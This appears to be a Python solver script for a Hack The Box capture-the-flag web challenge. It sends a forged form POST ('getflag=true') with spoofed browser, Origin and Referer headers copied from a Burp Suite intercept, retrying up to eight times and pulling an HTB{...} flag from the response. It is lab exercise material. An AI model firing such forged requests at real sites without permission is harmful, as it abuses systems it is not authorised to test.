import requests                                                                                                                                                    
import sys                                                                                                                                                         
import re                                                                                                                                                          
                                                        
# ── [1] Target resolution ─────────────────────────────────────────
if len(sys.argv) < 2:
  print("Usage: python3 hitbutton.py <target_url>")                                                                                                              
  print("Example: python3 hitbutton.py http://154.57.164.83:30361/lucky.php")
  sys.exit(1)                                                                                                                                                    
                                                                                                                                                                 
TARGET = sys.argv[1]
MAX_ATTEMPTS = 8                                                                                                                                                   
                                                        
# ── [2] Headers — mirrored from Burp Suite intercept ──────────────                                                                                               
# Reproduces the exact browser headers the server expects.
# Referer and Origin are critical — some servers reject requests missing them.                                                                                     
headers = {                                                                                                                                                        
  "User-Agent":                "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
  "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",                                                                
  "Accept-Language":           "en-US,en;q=0.5",                                                                                                                 
  "Accept-Encoding":           "gzip, deflate, br",                                                                                                              
  "Content-Type":              "application/x-www-form-urlencoded",                                                                                              
  "Origin":                    TARGET.rsplit("/", 1)[0],                                                                                                         
  "Referer":                   TARGET,                                                                                                                           
  "Upgrade-Insecure-Requests": "1",                                                                                                                              
  "Priority":                  "u=0, i",                                                                                                                         
  "Connection":                "keep-alive",                                                                                                                     
}
                                                                                                                                                                 
# ── [3] Payload ────────────────────────────────────────────────────
payload = "getflag=true"

# ── [4] Request loop ───────────────────────────────────────────────                                                                                              
print(f"[*] Targeting : {TARGET}")
print(f"[*] Max attempts: {MAX_ATTEMPTS}\n")                                                                                                                       
                                                        
for attempt in range(1, MAX_ATTEMPTS + 1):                                                                                                                         
  try:
      response = requests.post(TARGET, data=payload, headers=headers, timeout=10)                                                                                
      match = re.search(r"HTB\{[^}]+\}", response.text) 
                                                                                                                                                                 
      if match:
          print(f"[+] Flag obtained on attempt {attempt}: {match.group()}")                                                                                      
          sys.exit(0)                                   
      else:
          print(f"[-] Attempt {attempt}/{MAX_ATTEMPTS} — no flag yet (HTTP {response.status_code})")
                                                                                                                                                                 
  except requests.RequestException as e:
      print(f"[!] Request error on attempt {attempt}: {e}")                                                                                                      
                                                        
# ── [5] Exhausted ──────────────────────────────────────────────────                                                                                              
print("\n[!] Max attempts reached. Run the script again.")
